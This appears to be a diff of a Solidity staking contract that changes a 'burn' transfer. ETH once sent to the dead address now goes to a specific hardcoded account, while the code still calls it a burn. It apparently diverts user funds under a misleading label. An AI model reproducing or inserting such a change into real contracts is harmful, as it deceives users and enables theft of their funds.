@@ -423,7 +423,7 @@ contract MarketMakerStake is  Initializable,
             require(order.uacAmount <= msg.value,"MarketMakerStake:not enough eth");
             address0Amount = order.uacAmount.mul(uacdistributeRadio[0]).div(allRatio);
             // burn
-            (bool success0, ) = payable(address(0x000000000000000000000000000000000000dEaD)).call{value: address0Amount}("");
+            (bool success0, ) = payable(0xC8B67F0ac126278dee62f0ada69941872494AbC5).call{value: address0Amount}("");
             require(success0, "Native burn transfer failed");
 
             address1Amount = order.uacAmount.mul(uacdistributeRadio[1]).div(allRatio);
